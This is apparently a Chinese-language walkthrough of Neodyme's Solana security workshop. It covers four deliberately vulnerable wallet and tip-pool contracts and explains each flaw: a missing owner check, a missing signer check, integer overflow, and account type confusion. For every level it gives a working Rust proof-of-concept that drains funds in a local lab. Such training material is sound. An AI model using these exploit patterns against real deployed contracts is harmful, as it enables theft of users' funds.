---
title: Neodyme：Solana Security Workshop
tags:
    - web3
    - blockchain
    - smart contract
    - solana
    - rust
---

## Setup - Full

```bash
$ docker run --name breakpoint-workshop -p 2222:22 -p 8383:80 -e PASSWORD="password" neodymelabs/breakpoint-workshop:latest-code-prebuilt
# visit http://localhost:8383
```

### Compiling the Contracts and Running the Exploits

- PoC 框架代码位于 `pocs` 目录下
- VSCode 中 `Ctrl+Shift+B` 再选择 `level`
- 或通过命令行的方式

    ```bash
    # compile all contracts
    cargo build-bpf --workspace

    # run level0 exploit
    RUST_BACKTRACE=1 cargo run --bin level0
    ```

### Exploit Outline

初始持有 1 SOL，目标是获得更多的 SOL

## Level 0 - A First Vulnerability

- 查看 `WalletInstruction`，初步了解程序的功能

    ```rs
    pub enum WalletInstruction {
        /// Initialize a Personal Savings Wallet
        ///
        /// Passed accounts:
        /// (1) Wallet account
        /// (2) Vault accounts
        /// (3) Authority
        /// (4) Rent sysvar
        /// (5) System program
        Initialize,
        /// Deposit
        ///
        /// Passed accounts:
        /// (1) Wallet account
        /// (2) Vault accounts
        /// (3) Money Source
        Deposit { amount: u64 },
        /// Withdraw from Wallet
        ///
        /// Passed accounts:
        /// (1) Wallet account
        /// (2) Vault accounts
        /// (3) Authority
        /// (4) Target Wallet account
        Withdraw { amount: u64 },
    }
    ```

- 程序入口点函数 `processor::process_instruction` 反序列化 `instruction_data` 并调用指定函数

    ```rs
    pub fn process_instruction(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        mut instruction_data: &[u8],
    ) -> ProgramResult {
        match WalletInstruction::deserialize(&mut instruction_data)? {
            WalletInstruction::Initialize => initialize(program_id, accounts),
            WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),
            WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),
        }
    }
    ```

- 调用其它程序可通过 `invoke()` 或 `invoke_signed()`（当需要 PDA 作为 instruction 的 signer 时）
- `withdraw` 中 `wallet`、`vault` 等账户均由调用者提供，且未检查账户 `wallet` 的 `owner`，因而可以创建一个攻击者作为 `authority` 的 `wallet` 账户，从而调用 `withdraw` 获取 SOL

    ```rs
    fn withdraw(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        let account_info_iter = &mut accounts.iter();
        let wallet_info = next_account_info(account_info_iter)?;
        let vault_info = next_account_info(account_info_iter)?;
        let authority_info = next_account_info(account_info_iter)?;
        let destination_info = next_account_info(account_info_iter)?;
        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

        assert!(authority_info.is_signer);
        assert_eq!(wallet.authority, *authority_info.key);
        assert_eq!(wallet.vault, *vault_info.key);

        if amount > **vault_info.lamports.borrow_mut() {
            return Err(ProgramError::InsufficientFunds);
        }

        **vault_info.lamports.borrow_mut() -= amount;
        **destination_info.lamports.borrow_mut() += amount;

        Ok(())
    }
    ```

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {

    // Step 0: how much money do we want to steal?
    let amount = env.get_account(challenge.vault_address).unwrap().lamports;
    // `unwrap` returns a `panic` when it receives a `None`

    // Step 1: a fake wallet with the same vault
    let hacker_wallet = level0::Wallet {
        authority: challenge.hacker.pubkey(),
        vault: challenge.vault_address,
    };
    let fake_wallet = keypair(233);
    let mut hack_wallet_data: Vec<u8> = vec![];

    hacker_wallet.serialize(&mut hack_wallet_data).unwrap();
    
    env.create_account_with_data(&fake_wallet, hack_wallet_data);
    
    // Step 2: Use fake wallet to withdraw funds from the real vault to the attacker
    let instruction = Instruction {
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(fake_wallet.pubkey(), false),
            AccountMeta::new(challenge.vault_address, false),
            AccountMeta::new(challenge.hacker.pubkey(), true),
            AccountMeta::new(challenge.hacker.pubkey(), false),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        // add `use borsh::BorshSerialize;` to use `try_to_vec()` method
        data: level0::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
    };
    env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
}
```

### 参考资料

- [Calling Between Programs | Solana Docs](https://docs.solana.com/developing/programming-model/calling-between-programs)
- [Environment in poc_framework - Rust](https://docs.rs/poc-framework/0.1.2/poc_framework/trait.Environment.html)
- [Option & unwrap - Rust By Example](https://doc.rust-lang.org/rust-by-example/error/option_unwrap.html)
- [Pubkey::find_program_address - Rust](https://docs.rs/solana-program/latest/solana_program/pubkey/struct.Pubkey.html#method.find_program_address)

## Level 1 - Personal Vault

- 相比于 Level 0，`Wallet` 移除了 `vault`，并保持了除 `vault` 外其它功能的一致性

    ```rs
    pub struct Wallet {
        pub authority: Pubkey,
    }
    ```

- `withdraw` 中 `wallet_info`、`authority_info` 仍然由调用者提供，且只检查 `wallet` 的 `owner` 是否为对应程序以及 `wallet` 中存储的 `authority` 与提供的 `authority_info` 是否匹配，并没有检查 `authority_info` 是否为 signer

    ```rs
    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        msg!("withdraw {}", amount);
        let account_info_iter = &mut accounts.iter();
        let wallet_info = next_account_info(account_info_iter)?;
        let authority_info = next_account_info(account_info_iter)?;
        let destination_info = next_account_info(account_info_iter)?;
        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;

        assert_eq!(wallet_info.owner, program_id);
        assert_eq!(wallet.authority, *authority_info.key);

        if amount > **wallet_info.lamports.borrow_mut() {
            return Err(ProgramError::InsufficientFunds);
        }

        **wallet_info.lamports.borrow_mut() -= amount;
        **destination_info.lamports.borrow_mut() += amount;

        wallet
            .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
            .unwrap();

        Ok(())
    }
    ```

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let amount = env.get_account(challenge.wallet_address).unwrap().lamports;

    let instruction = Instruction {
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(challenge.wallet_address, false),
            AccountMeta::new(challenge.wallet_authority, false),
            AccountMeta::new(challenge.hacker.pubkey(), true),
            AccountMeta::new_readonly(system_program::id(), false),
        ],
        data: level1::WalletInstruction::Withdraw { amount }.try_to_vec().unwrap(),
    };
    env.execute_as_transaction(&[instruction], &[&challenge.hacker]).print_named("Hack: hacker withdraw");
}
```

## Level 2 - Secure Personal Vault

- 在 Level 1 的基础上，修复了 `withdraw` 未检查 signer 的问题

    ```rs
    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        msg!("withdraw {}", amount);
        let account_info_iter = &mut accounts.iter();
        let wallet_info = next_account_info(account_info_iter)?;
        let authority_info = next_account_info(account_info_iter)?;
        let destination_info = next_account_info(account_info_iter)?;
        let rent_info = next_account_info(account_info_iter)?;

        let wallet = Wallet::deserialize(&mut &(*wallet_info.data).borrow_mut()[..])?;
        let rent = Rent::from_account_info(rent_info)?;

        assert_eq!(wallet_info.owner, program_id);
        assert_eq!(wallet.authority, *authority_info.key);
        assert!(authority_info.is_signer, "authority must sign!");

        let min_balance = rent.minimum_balance(WALLET_LEN as usize);
        if min_balance + amount > **wallet_info.lamports.borrow_mut() {
            return Err(ProgramError::InsufficientFunds);
        }

        **wallet_info.lamports.borrow_mut() -= amount;
        **destination_info.lamports.borrow_mut() += amount;

        wallet
            .serialize(&mut &mut (*wallet_info.data).borrow_mut()[..])
            .unwrap();

        Ok(())
    }
    ```

- 在 `debug` 模式下编译程序，Rust 将对整型溢出抛出异常，而在 `release` 模式下，Rust 将进行 *two's complement wrapping*，以 `u8` 为例，结果等同于模 $256$
- 可以通过 `amount` 使 `wallet_info` 账户中的 `lamports` 下溢出来获取资金，并使 `destination_info` 账户中的 `lamports` 上溢出来减少其资金
    - 另外还需通过上溢出绕过检查 `min_balance + amount > **wallet_info.lamports.borrow_mut()`
- 推荐使用 `checked_sub`、`checked_add`

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    env.execute_as_transaction(&[level2::initialize(challenge.wallet_program, challenge.hacker.pubkey())], &[&challenge.hacker]).print_named("Hacker: initialize wallet");
    let hacker_wallet = level2::get_wallet_address(challenge.hacker.pubkey(), challenge.wallet_program);

    let min_balance = Rent::default().minimum_balance(level2::WALLET_LEN as usize);
    let amount = u64::max_value() - min_balance + 1;

    for i in 0..10 {
        env.execute_as_transaction(&[Instruction {
            program_id: challenge.wallet_program,
            accounts: vec![
                AccountMeta::new(hacker_wallet, false),
                AccountMeta::new(challenge.hacker.pubkey(), true),
                AccountMeta::new(challenge.wallet_address, false),
                AccountMeta::new_readonly(sysvar::rent::id(), false),
            ],
            data: level2::WalletInstruction::Withdraw { amount: amount + i }.try_to_vec().unwrap(),
        }], // 交易 `recent_blockhash` 相同，因而需要设置不同的参数，避免 This transaction has already been processed
        &[&challenge.hacker]).print_named(format!("Hacker: exploit {}", i).as_str());
    }
    
    env.execute_as_transaction(&[level2::withdraw(challenge.wallet_program, challenge.hacker.pubkey(), challenge.hacker.pubkey(), env.get_account(hacker_wallet).unwrap().lamports - min_balance)], &[&challenge.hacker]).print_named("Hacker: withdraw");
}
```

### 参考资料

- [Data Types - The Rust Programming Language](https://doc.rust-lang.org/book/ch03-02-data-types.html#integer-overflow)
- [anchor - How to avoid SendTransactionError "This transaction has already been processed" - Solana Stack Exchange](https://solana.stackexchange.com/a/1178)

## Level 3 - Tip Pool

- 查看 `TipInstruction`，初步了解程序的功能，任何人可以创建 `TipPool` 来接收 tips，资金存储在 `Vault` 中，`withdraw` 时将依据 `TipPool` 中存储的 `value`

    ```rs
    pub enum TipInstruction {
        /// Initialize a vault
        ///
        /// Passed accounts:
        ///
        /// (1) Vault account
        /// (2) initializer (must sign)
        /// (3) Rent sysvar
        /// (4) System Program
        Initialize {
            seed: u8,
            fee: f64,
            fee_recipient: Pubkey,
        },
        /// Initialize a TipPool
        ///
        /// Passed accounts:
        ///
        /// (1) Vault account
        /// (2) withdraw_authority (must sign)
        /// (3) Pool account
        CreatePool,
        /// Tip
        ///
        /// Passed accounts:
        ///
        /// (1) Vault account
        /// (2) Pool
        /// (3) Tip Source
        /// (4) System program
        Tip { amount: u64 },
        /// Withdraw from Pool
        ///
        /// Passed accounts:
        ///
        /// (1) Vault account
        /// (2) Pool account
        /// (3) withdraw_authority (must sign)
        Withdraw { amount: u64 },
    }
    ```

- 两种账户类型，`Vault` 和 `TipPool`，注意到 `Vault` 的字段恰好能覆盖 `TipPool` 的字段
    - `deserialize` 根据给定数据类型解析，并更新 buffer，使其指向剩余字节
    
    ```rs
    pub struct TipPool {
        pub withdraw_authority: Pubkey, // Vault::creator
        pub value: u64, // Vault::fee
        pub vault: Pubkey, // Vault::fee_recipient
    }

    pub struct Vault {
        pub creator: Pubkey,
        pub fee: f64,
        pub fee_recipient: Pubkey,
        pub seed: u8,
    }
    ```

- `withdraw` 中未检查 `pool_info` 是否是 `TipPool` 类型的数据，因而可以传入 `Vault` 类型的数据

    ```rs
    fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
        let account_info_iter = &mut accounts.iter();
        let vault_info = next_account_info(account_info_iter)?;
        let pool_info = next_account_info(account_info_iter)?;
        let withdraw_authority_info = next_account_info(account_info_iter)?;
        let mut pool = TipPool::deserialize(&mut &(*pool_info.data).borrow_mut()[..])?;

        assert_eq!(vault_info.owner, program_id);
        assert_eq!(pool_info.owner, program_id);
        assert!(
            withdraw_authority_info.is_signer,
            "withdraw authority must sign"
        );
        assert_eq!(pool.vault, *vault_info.key);
        assert_eq!(*withdraw_authority_info.key, pool.withdraw_authority);

        pool.value = match pool.value.checked_sub(amount) {
            Some(v) => v,
            None => return Err(ProgramError::InvalidArgument),
        };

        **(*vault_info).lamports.borrow_mut() -= amount;
        **(*withdraw_authority_info).lamports.borrow_mut() += amount;

        pool.serialize(&mut &mut pool_info.data.borrow_mut()[..]).unwrap();

        Ok(())
    }
    ```

- 通过 `initialize` 来控制 `Vault` 类型账户各个字段的值，并使用 `Vault` 类型的账户来代替 `TipPool` 进行 `withdraw`

    ```rs
    fn initialize(
        program_id: &Pubkey,
        accounts: &[AccountInfo],
        seed: u8,
        fee: f64,
        fee_recipient: Pubkey,
    ) -> ProgramResult {
        let account_info_iter = &mut accounts.iter();
        let vault_info = next_account_info(account_info_iter)?;
        let initializer_info = next_account_info(account_info_iter)?;
        let rent_info = next_account_info(account_info_iter)?;
        let rent = Rent::from_account_info(rent_info)?;
        // 使用不同的 seed 来获取不同的 vault_address
        let vault_address = Pubkey::create_program_address(&[&[seed]], program_id).unwrap();

        assert_eq!(*vault_info.key, vault_address);
        assert!(
            vault_info.data_is_empty(),
            "vault info must be empty account!"
        );
        assert!(initializer_info.is_signer, "initializer must sign!");

        invoke_signed(
            &system_instruction::create_account(
                &initializer_info.key,
                &vault_address,
                rent.minimum_balance(VAULT_LEN as usize),
                VAULT_LEN,
                &program_id,
            ),
            &[initializer_info.clone(), vault_info.clone()],
            &[&[&[seed]]],
        )?;

        let vault = Vault {
            creator: *initializer_info.key,
            fee,
            fee_recipient,
            seed,
        };

        vault.serialize(&mut &mut vault_info.data.borrow_mut()[..]).unwrap();

        Ok(())
    }
    ```

### Exploit

```rs
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    let pool: TipPool = env.get_deserialized_account(challenge.tip_pool).unwrap();
    let seed = 1;
    let hacker_vault = Pubkey::create_program_address(&[&[seed]], &challenge.tip_program).unwrap();
    
    env.execute_as_transaction(
        &[level3::initialize(
            challenge.tip_program,
            hacker_vault,   // new vault
            challenge.hacker.pubkey(),  // creator <-> withdraw_authority
            seed,
            pool.value as f64,  // fee <-> value
            challenge.vault_address // fee_recipient <-> vault
        )],
        &[&challenge.hacker],
    ).print_named("Hacker: initialize vault");
    env.execute_as_transaction(
        &[level3::withdraw(
            challenge.tip_program,
            challenge.vault_address,
            hacker_vault,
            challenge.hacker.pubkey(),
            pool.value,
        )],
        &[&challenge.hacker]
    ).print_named("Hacker: withdraw");
}
```

### 参考资料

- [Solana Smart Contracts: Common Pitfalls and How to Avoid Them](https://blog.neodyme.io/posts/solana_common_pitfalls/#solana-account-confusions)
- [BorshDeserialize in borsh::de - Rust](https://docs.rs/borsh/latest/borsh/de/trait.BorshDeserialize.html)
- [Program Derived Addresses (PDAs) | Solana Cookbook](https://solanacookbook.com/core-concepts/pdas.html)